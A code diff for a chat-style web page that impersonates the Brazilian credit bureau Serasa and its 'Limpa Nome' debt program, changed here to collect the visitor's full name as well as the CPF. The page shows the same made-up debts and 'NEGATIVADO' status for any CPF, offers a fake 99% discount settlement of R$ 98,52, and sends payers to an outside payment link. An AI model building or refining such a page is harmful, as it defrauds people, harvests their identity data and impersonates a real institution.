@@ -589,18 +589,23 @@
 </div>
 
 <script>
-// Função para obter CPF da URL
-function getCPFfromURL() {
+// Função para obter CPF e NOME da URL
+function getDataFromURL() {
   const params = new URLSearchParams(window.location.search);
-  return params.get('cpf');
+  return {
+    cpf: params.get('cpf'),
+    nome: params.get('nome') ? decodeURIComponent(params.get('nome')) : null
+  };
 }
 
-// Verificar se já tem CPF na URL
-const urlCPF = getCPFfromURL();
-console.log('CPF da URL:', urlCPF);
+// Verificar se já tem CPF e Nome na URL
+const urlData = getDataFromURL();
+console.log('CPF da URL:', urlData.cpf);
+console.log('Nome da URL:', urlData.nome);
 
 // Dados do usuário
 let userCPF = '';
+let userName = '';
 
 // Durações dos áudios em segundos (ajuste conforme seus arquivos)
 const audioDurations = {
@@ -713,7 +718,7 @@ function showButtons(buttons) {
         setTimeout(() => el.remove(), 300);
       });
       
-      // VERIFICA SE TEM REDIRECT URL (ALTERAÇÃO FEITA AQUI)
+      // VERIFICA SE TEM REDIRECT URL
       if (button.redirectUrl) {
         setTimeout(() => {
           window.location.href = button.redirectUrl;
@@ -732,17 +737,18 @@ function showButtons(buttons) {
   scrollToBottom();
 }
 
-// Função para mostrar input de CPF
-function showCPFInput() {
+// Função para mostrar input de CPF e NOME
+function showDataInput() {
   const messagesContainer = document.getElementById('messages');
   const inputContainer = document.createElement('div');
   inputContainer.className = 'cpf-input-container';
   
   inputContainer.innerHTML = `
+    <input type="text" class="cpf-input" id="nomeInput" placeholder="Digite seu nome completo" style="margin-bottom: 10px;">
     <input type="text" class="cpf-input" id="cpfInput" placeholder="000.000.000-00" maxlength="14">
-    <div class="cpf-hint">Digite apenas os números do seu CPF</div>
+    <div class="cpf-hint">Digite seu nome completo e CPF para continuar</div>
     <div class="buttons-container" style="margin-top: 12px;">
-      <button class="action-btn primary-btn" id="confirmCpf">Confirmar CPF</button>
+      <button class="action-btn primary-btn" id="confirmData">Confirmar Dados</button>
     </div>
   `;
   
@@ -750,10 +756,13 @@ function showCPFInput() {
   scrollToBottom();
   
   setTimeout(() => {
+    const nomeInput = document.getElementById('nomeInput');
+    if (nomeInput) {
+      nomeInput.focus();
+    }
+    
     const cpfInput = document.getElementById('cpfInput');
     if (cpfInput) {
-      cpfInput.focus();
-      
       cpfInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
         if (value.length > 11) value = value.substring(0, 11);
@@ -770,44 +779,61 @@ function showCPFInput() {
     }
   }, 100);
   
-  document.getElementById('confirmCpf').addEventListener('click', function() {
-    validateCPF();
+  document.getElementById('confirmData').addEventListener('click', function() {
+    validateData();
   });
+  
+  document.getElementById('nomeInput').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') document.getElementById('cpfInput').focus();
+  });
+  
   document.getElementById('cpfInput').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') validateCPF();
+    if (e.key === 'Enter') validateData();
   });
 }
 
-// Função para validar CPF - AQUI É ONDE SALVA O CPF
-async function validateCPF(inputCPF = null) {
-  let cpf;
+// Função para validar dados - AQUI É ONDE SALVA OS DADOS
+async function validateData(inputData = null) {
+  let nome, cpf;
   
-  if (inputCPF !== null && inputCPF !== undefined) {
-    cpf = inputCPF;
+  if (inputData !== null && inputData !== undefined) {
+    nome = inputData.nome;
+    cpf = inputData.cpf;
   } else {
+    const nomeInput = document.getElementById('nomeInput');
     const cpfInput = document.getElementById('cpfInput');
-    if (!cpfInput) return;
+    if (!nomeInput || !cpfInput) return;
+    
+    nome = nomeInput.value.trim();
     cpf = cpfInput.value;
   }
   
   cpf = cpf.toString().replace(/\D/g, '');
   
+  // Validação do nome
+  if (!nome || nome.length < 2) {
+    const typingIndicator = showTypingIndicator('Sistema');
+    await new Promise(resolve => setTimeout(resolve, 800));
+    typingIndicator.remove();
+    
+    addMessage('Por favor, digite seu nome completo.', 'system');
+    return;
+  }
+  
+  // Validação do CPF
   if (!isValidCPF(cpf)) {
     const typingIndicator = showTypingIndicator('Sistema');
     await new Promise(resolve => setTimeout(resolve, 800));
     typingIndicator.remove();
     
     addMessage('Por favor, digite um CPF válido com 11 números.', 'system');
-    
-    if (inputCPF === null || inputCPF === undefined) {
-      showCPFInput();
-    }
     return;
   }
   
-  // SALVA O CPF DO USUÁRIO
+  // SALVA OS DADOS DO USUÁRIO
   userCPF = cpf;
-  console.log('CPF salvo:', userCPF);
+  userName = nome;
+  console.log('Dados salvos:', { nome: userName, cpf: userCPF });
   
   const inputContainer = document.querySelector('.cpf-input-container');
   if (inputContainer) {
@@ -816,14 +842,14 @@ async function validateCPF(inputCPF = null) {
     setTimeout(() => inputContainer.remove(), 300);
   }
   
-  if (inputCPF === null || inputCPF === undefined) {
-    addMessage(maskCPF(cpf), 'user');
+  if (inputData === null || inputData === undefined) {
+    addMessage(`${nome} - ${maskCPF(cpf)}`, 'user');
   } else {
     const typingIndicator = showTypingIndicator('Sistema');
     await new Promise(resolve => setTimeout(resolve, 800));
     typingIndicator.remove();
     
-    addMessage(`CPF ${maskCPF(cpf)} identificado automaticamente.`, 'system');
+    addMessage(`Dados de ${nome} identificados automaticamente.`, 'system');
   }
   
   setTimeout(() => processStep(4), 800);
@@ -852,7 +878,7 @@ const mediaUrls = {
   audio5: './files/audio5.mp3'
 };
 
-// Fluxo do chat - SEM PLACEHOLDERS COMPLEXOS
+// Fluxo do chat - COM TEXTOS ATUALIZADOS
 const flow = [
   {
     id: 1,
@@ -877,19 +903,19 @@ const flow = [
     id: 3,
     type: 'bot',
     sender: 'Bot Serasa',
-    content: 'Olá! Para começarmos, preciso que você digite seu CPF para identificarmos seu perfil:',
-    action: 'input_cpf'
+    content: 'Olá! Para começarmos, preciso que você digite seu nome completo e CPF para identificarmos seu perfil:',
+    action: 'input_data'
   },
   {
     id: 4,
     type: 'system',
-    content: 'Verificando CPF no banco de dados Serasa...',
+    content: 'Verificando dados no banco de dados Serasa...',
     autoNext: true
   },
   {
     id: 5,
     type: 'system',
-    content: 'CPF validado com sucesso!',
+    content: 'Dados validados com sucesso!',
     media: `<div class="message-media"><img src="${mediaUrls.feiraoSemFraude}" alt="Feirão Sem Fraude" class="media-image"></div>`,
     autoNext: true
   },
@@ -907,6 +933,8 @@ const flow = [
     sender: 'Fernanda - Especialista Serasa',
     content: 'Confirmação de dados:',
     subtext: `<div class="highlight-box">
+        <strong>Nome informado:</strong>
+        <div class="masked-data">Aguardando...</div>
         <strong>CPF informado:</strong>
         <div class="masked-data">Aguardando...</div>
         <p style="margin-top: 6px; font-size: 0.85rem;">Estas informações estão corretas?</p>
@@ -1013,9 +1041,9 @@ const flow = [
     id: 19,
     type: 'atendente',
     sender: 'Fernanda - Especialista Serasa',
-    content: 'Situação do CPF:',
+    content: 'Situação cadastral:',
     media: `<div class="message-media"><img src="${mediaUrls.scoreImage}" alt="Score Baixo" class="media-image"></div>`,
-    subtext: `Identificamos 4 dívidas ativas no sistema do CPF.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`,
+    subtext: `Identificamos 4 dívidas ativas no sistema do CPF informado.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`,
     buttons: [
       { text: 'BUSCAR ACORDOS DISPONÍVEIS', next: 20, type: 'primary' }
     ]
@@ -1062,7 +1090,7 @@ const flow = [
     sender: 'Fernanda - Especialista Serasa',
     content: 'ACORDO ENCONTRADO!',
     subtext: `<div class="success-box">
-        <strong>OFERTA EXCLUSIVA para você:</strong><br><br>
+        <strong>OFERTA EXCLUSIVA:</strong><br><br>
         • 99% DE DESCONTO<br>
         • Quitação de TODAS as 4 dívidas<br>
         • Aumento para 890 pontos no score<br>
@@ -1093,7 +1121,7 @@ const flow = [
     subtext: `<div class="success-box">
         <strong>RESUMO DO SEU ACORDO:</strong><br><br>
         • Contrato: 83N2L618362E<br>
-        • Beneficiário: CPF<br>
+        • Beneficiário: Portador do CPF<br>
         • Quitação: Todas as 4 dívidas<br>
         • Valor final: R$ 98,52<br>
         • Desconto: 99%
@@ -1127,7 +1155,7 @@ const flow = [
         text: 'PAGAR E LIMPAR MEU NOME AGORA', 
         next: 29, 
         type: 'success',
-        redirectUrl: 'https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E' // ← REDIRECT ADICIONADO AQUI
+        redirectUrl: 'https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E'
       }
     ]
   },
@@ -1140,9 +1168,9 @@ const flow = [
 ];
 
 let currentStep = 0;
-let cpfFromURLProcessed = false;
+let dataFromURLProcessed = false;
 
-// Processar cada passo do fluxo - AQUI É ONDE ADICIONAMOS O CPF DINAMICAMENTE
+// Processar cada passo do fluxo - AQUI É ONDE ADICIONAMOS OS DADOS DINAMICAMENTE
 async function processStep(stepId) {
   const step = flow.find(s => s.id === stepId);
   if (!step) return;
@@ -1161,9 +1189,9 @@ async function processStep(stepId) {
     let content = step.content;
     let media = step.media || '';
     
-    // PASSO 5: Adiciona CPF se tiver
-    if (stepId === 5 && userCPF) {
-      content = `CPF ${maskCPF(userCPF)} validado com sucesso!`;
+    // PASSO 5: Adiciona dados se tiver
+    if (stepId === 5 && userName && userCPF) {
+      content = `Dados de ${userName} validados com sucesso!`;
     }
     
     addMessage(content, 'system', '', media);
@@ -1181,8 +1209,8 @@ async function processStep(stepId) {
       setTimeout(() => processStep(stepId + 1), 1500);
     } else if (step.buttons) {
       setTimeout(() => showButtons(step.buttons), 500);
-    } else if (step.action === 'input_cpf') {
-      setTimeout(() => showCPFInput(), 500);
+    } else if (step.action === 'input_data') {
+      setTimeout(() => showDataInput(), 500);
     }
     
   } else if (step.type === 'bot' || step.type === 'atendente') {
@@ -1195,9 +1223,16 @@ async function processStep(stepId) {
     let subtext = step.subtext || '';
     let media = step.media || '';
     
-    // PASSO 7: Mostra o CPF na confirmação
-    if (stepId === 7 && userCPF) {
+    // PASSO 6: Saudação com nome
+    if (stepId === 6 && userName) {
+      content = `Olá ${userName}! Eu sou a Fernanda, sua atendente especialista.`;
+    }
+    
+    // PASSO 7: Mostra os dados na confirmação
+    if (stepId === 7 && userName && userCPF) {
       subtext = `<div class="highlight-box">
+          <strong>Nome informado:</strong>
+          <div class="masked-data">${userName}</div>
           <strong>CPF informado:</strong>
           <div class="masked-data">${maskCPF(userCPF)}</div>
           <p style="margin-top: 6px; font-size: 0.85rem;">Estas informações estão corretas?</p>
@@ -1205,20 +1240,24 @@ async function processStep(stepId) {
     }
     
     // PASSO 12: Saudação personalizada
-    if (stepId === 12 && userCPF) {
-      content = `Perfeito, ${maskCPF(userCPF)}!`;
+    if (stepId === 12 && userName) {
+      content = `Perfeito, ${userName}!`;
     }
     
-    // PASSO 19: Situação do CPF
+    // PASSO 19: Situação cadastral
     if (stepId === 19 && userCPF) {
-      content = `Situação do CPF ${maskCPF(userCPF)}:`;
-      subtext = `Identificamos 4 dívidas ativas no sistema do CPF ${maskCPF(userCPF)}.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`;
+      content = `${userName ? userName + ', sua ' : 'Sua '}situação cadastral:`;
+      if (userName) {
+        subtext = `${userName}, identificamos 4 dívidas ativas no sistema do portador do CPF ${maskCPF(userCPF)}.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`;
+      } else {
+        subtext = `Identificamos 4 dívidas ativas no sistema do portador do CPF ${maskCPF(userCPF)}.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`;
+      }
     }
     
     // PASSO 23: Oferta exclusiva
-    if (stepId === 23 && userCPF) {
+    if (stepId === 23 && userName) {
       subtext = `<div class="success-box">
-          <strong>OFERTA EXCLUSIVA para ${maskCPF(userCPF)}:</strong><br><br>
+          <strong>OFERTA EXCLUSIVA para você, ${userName}:</strong><br><br>
           • 99% DE DESCONTO<br>
           • Quitação de TODAS as 4 dívidas<br>
           • Aumento para 890 pontos no score<br>
@@ -1227,13 +1266,13 @@ async function processStep(stepId) {
         </div>`;
     }
     
-    // PASSO 26: Parabéns com CPF
-    if (stepId === 26 && userCPF) {
-      content = `PARABÉNS, portador do CPF ${maskCPF(userCPF)}!`;
+    // PASSO 26: Parabéns com dados
+    if (stepId === 26 && userName) {
+      content = `PARABÉNS, ${userName}!`;
       subtext = `<div class="success-box">
           <strong>RESUMO DO SEU ACORDO:</strong><br><br>
           • Contrato: 83N2L618362E<br>
-          • Beneficiário: CPF ${maskCPF(userCPF)}<br>
+          • Beneficiário: ${userName} (Portador do CPF ${maskCPF(userCPF)})<br>
           • Quitação: Todas as 4 dívidas<br>
           • Valor final: R$ 98,52<br>
           • Desconto: 99%
@@ -1272,8 +1311,8 @@ async function processStep(stepId) {
     
     if (step.buttons) {
       setTimeout(() => showButtons(step.buttons), 500);
-    } else if (step.action === 'input_cpf') {
-      setTimeout(() => showCPFInput(), 300);
+    } else if (step.action === 'input_data') {
+      setTimeout(() => showDataInput(), 300);
     } else if (step.autoNext || step.delay) {
       setTimeout(() => processStep(stepId + 1), 1500);
     }
@@ -1286,11 +1325,11 @@ async function processStep(stepId) {
   }
 }
 
-// Função para iniciar o fluxo baseado no CPF da URL
-function startFlowBasedOnCPF() {
-  if (urlCPF && isValidCPF(urlCPF) && !cpfFromURLProcessed) {
-    cpfFromURLProcessed = true;
-    console.log('CPF da URL detectado, validando...');
+// Função para iniciar o fluxo baseado nos dados da URL
+function startFlowBasedOnData() {
+  if (urlData.cpf && isValidCPF(urlData.cpf) && urlData.nome && !dataFromURLProcessed) {
+    dataFromURLProcessed = true;
+    console.log('Dados da URL detectados, validando...');
     
     setTimeout(() => {
       addMessage('Bem-vindo ao canal oficial Serasa Limpa Nome!', 'bot', 'Bot Serasa', `
@@ -1303,7 +1342,7 @@ function startFlowBasedOnCPF() {
         addMessage('Feirão Serasa Limpa Nome - Programa oficial sem fraudes', 'bot', 'Bot Serasa');
         
         setTimeout(() => {
-          validateCPF(urlCPF);
+          validateData({ nome: urlData.nome, cpf: urlData.cpf });
         }, 1500);
       }, 1500);
     }, 800);
@@ -1314,7 +1353,7 @@ function startFlowBasedOnCPF() {
 }
 
 // Inicializar chat
-setTimeout(() => startFlowBasedOnCPF(), 500);
+setTimeout(() => startFlowBasedOnData(), 500);
 </script>
 </body>
 </html>
